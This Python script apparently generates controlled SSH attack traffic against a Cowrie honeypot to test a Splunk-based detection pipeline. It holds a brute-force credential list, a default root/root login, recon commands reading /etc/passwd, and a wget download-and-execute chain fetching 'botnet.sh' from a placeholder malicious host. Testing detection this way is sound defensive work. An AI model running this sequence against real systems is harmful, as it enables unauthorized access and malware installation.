"""
Attack Simulator — generates controlled attack traffic against a Cowrie honeypot.

Runs a scripted SSH attack sequence:
  1. 12 failed SSH login attempts (brute force)
  2. 1 successful login with root/root
  3. Reconnaissance commands: whoami, id, uname -a, cat /etc/passwd
  4. Download: wget http://example.com/botnet.sh
  5. Execute: chmod +x /tmp/botnet.sh && /tmp/botnet.sh
  6. Disconnect

This produces ~20 Cowrie events that flow through Splunk into AEGIS,
creating a single Critical "account_compromise" incident.

Usage:
    pip install paramiko
    python scripts/attack_simulator.py --target <COWRIE_PUBLIC_IP> --port 2222

Requirements:
    paramiko (pip install paramiko)
"""

from __future__ import annotations

import argparse
import sys
import time

try:
    import paramiko
except ImportError:
    print("ERROR: paramiko is required. Install with: pip install paramiko")
    print("       pip install paramiko")
    sys.exit(1)


# ── Brute force credential list ──────────────────────────
BRUTE_FORCE_CREDS = [
    ("root", "admin123"),
    ("root", "password"),
    ("admin", "admin"),
    ("root", "123456"),
    ("root", "toor"),
    ("test", "test"),
    ("root", "letmein"),
    ("root", "qwerty"),
    ("root", "dragon"),
    ("root", "monkey"),
    ("root", "abc123"),
    ("root", "passw0rd"),
]

# ── Successful credential (Cowrie default) ───────────────
SUCCESS_CRED = ("root", "root")

# ── Post-auth commands ───────────────────────────────────
RECON_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
]

ATTACK_COMMANDS = [
    "wget http://malicious.example.com/botnet.sh -O /tmp/botnet.sh",
    "chmod +x /tmp/botnet.sh",
    "/tmp/botnet.sh",
]


def attempt_login(host: str, port: int, username: str, password: str) -> paramiko.SSHClient | None:
    """Attempt SSH login. Returns client on success, None on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
        return client
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        print(f"  [!] Connection error: {e}")
        return None


def run_commands(client: paramiko.SSHClient, commands: list[str]) -> None:
    """Execute commands over an SSH session."""
    for cmd in commands:
        print(f"  [CMD] {cmd}")
        try:
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode("utf-8", errors="replace").strip()
            if output:
                print(f"  [OUT] {output[:200]}")
        except Exception as e:
            print(f"  [!] Command error: {e}")
        time.sleep(2)  # Pace commands for realistic timing


def run_attack(host: str, port: int, delay: float = 3.0) -> None:
    """Execute the full attack sequence."""
    print(f"\n{'='*60}")
    print(f"  AEGIS Attack Simulator")
    print(f"  Target: {host}:{port}")
    print(f"{'='*60}\n")

    # Phase 1: Brute force
    print("[PHASE 1] Brute Force — 12 failed login attempts")
    print("-" * 40)
    for i, (user, passwd) in enumerate(BRUTE_FORCE_CREDS, 1):
        print(f"  [{i:2d}/12] Trying {user}:{passwd} ... ", end="")
        result = attempt_login(host, port, user, passwd)
        if result:
            print("SUCCESS (unexpected!)")
            result.close()
        else:
            print("FAILED ✓")
        time.sleep(delay)

    # Phase 2: Successful login
    print(f"\n[PHASE 2] Credential Discovery — trying known default")
    print("-" * 40)
    user, passwd = SUCCESS_CRED
    print(f"  Trying {user}:{passwd} ... ", end="")
    client = attempt_login(host, port, user, passwd)
    if client:
        print("SUCCESS ✓✓✓")
    else:
        print("FAILED — Cowrie may not accept this credential")
        print("  Aborting post-auth phase. Brute force events were still generated.")
        return

    time.sleep(2)

    # Phase 3: Reconnaissance
    print(f"\n[PHASE 3] Reconnaissance — gathering system info")
    print("-" * 40)
    run_commands(client, RECON_COMMANDS)

    # Phase 4: Malware download & execution
    print(f"\n[PHASE 4] Exploitation — download and execute payload")
    print("-" * 40)
    run_commands(client, ATTACK_COMMANDS)

    # Phase 5: Cleanup & disconnect
    print(f"\n[PHASE 5] Disconnect")
    print("-" * 40)
    client.close()
    print("  Session closed.")

    print(f"\n{'='*60}")
    print("  Attack simulation complete!")
    print("  Expected: ~20 Cowrie events → 1 Critical incident in AEGIS")
    print(f"{'='*60}\n")


def main():
    parser = argparse.ArgumentParser(
        description="AEGIS Attack Simulator — generates controlled Cowrie honeypot traffic"
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Cowrie honeypot IP or hostname",
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=2222,
        help="Cowrie SSH port (default: 2222)",
    )
    parser.add_argument(
        "--delay", "-d",
        type=float,
        default=3.0,
        help="Delay between login attempts in seconds (default: 3.0)",
    )

    args = parser.parse_args()
    run_attack(args.target, args.port, args.delay)


if __name__ == "__main__":
    main()
